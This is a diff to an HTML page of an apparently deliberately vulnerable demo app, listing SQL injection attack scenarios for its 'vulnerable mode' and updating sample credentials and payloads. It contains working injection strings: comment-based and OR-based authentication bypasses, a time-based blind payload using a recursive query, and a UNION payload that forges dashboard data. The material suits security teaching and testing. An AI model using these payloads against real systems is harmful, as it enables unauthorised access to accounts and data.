@@ -65,16 +65,16 @@
                 <h4>Optional Attack Scenarios (Vulnerable Mode Only):</h4>
                 
                 <h4>1. Regular Authentication (sanity check)</h4>
-                <p>ID: <code>374787521</code> Password: <code>pass1174</code></p>
+                <p>ID: <code>683314756</code> Password: <code>pass4482</code></p>
                 
                 <h4>2. Auth Bypass (ID Comment)</h4>
-                <p>ID: <code>374787521' -- </code> Password: <code>[any]</code></p>
+                <p>ID: <code>180955263' -- </code></p>
                 
                 <h4>3. Auth Bypass (Password Injection)</h4>
-                <p>ID: <code>374787521</code> Password: <code>' OR '1'='1</code></p>
+                <p>Password: <code>' OR '1'='1</code></p>
                 
                 <h4>4. Time-Based Blind SQLi</h4>
-                <p>Password: <code>' OR (WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i < 5000000) SELECT count(*) FROM r) > 0 -- </code></p>
+                <p>Password: <code>' OR (WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i < 10000000) SELECT count(*) FROM r) = 0 -- </code></p>
                 
                 <h4>5. Dashboard Forgery (UNION)</h4>
                 <p>Password: <code>' UNION SELECT '000', 'HACKED SYSTEM', 'N/A', 'N/A', 999999, '4580-0000-0000-0000', '12/99', '000' -- </code></p>
